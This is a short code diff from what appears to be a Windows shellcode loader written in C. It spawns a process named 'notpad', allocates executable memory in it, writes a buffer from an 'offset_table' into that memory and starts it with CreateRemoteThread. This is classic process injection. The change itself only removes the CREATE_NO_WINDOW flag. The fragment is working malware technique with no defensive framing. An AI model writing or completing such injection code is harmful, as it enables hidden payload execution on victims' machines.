@@ -33,8 +33,7 @@ int main()
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(STARTUPINFO);
 
-    CreateProcessA(NULL, "notpad", NULL, NULL, TRUE,  CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
-
+    CreateProcessA(NULL, "notpad", NULL, NULL, TRUE,  NULL, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
     LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, 0, sizeof(offset_table), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(pi.hProcess, lpBaseAddress, lpBuffer, sizeof(offset_table), NULL);
     CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
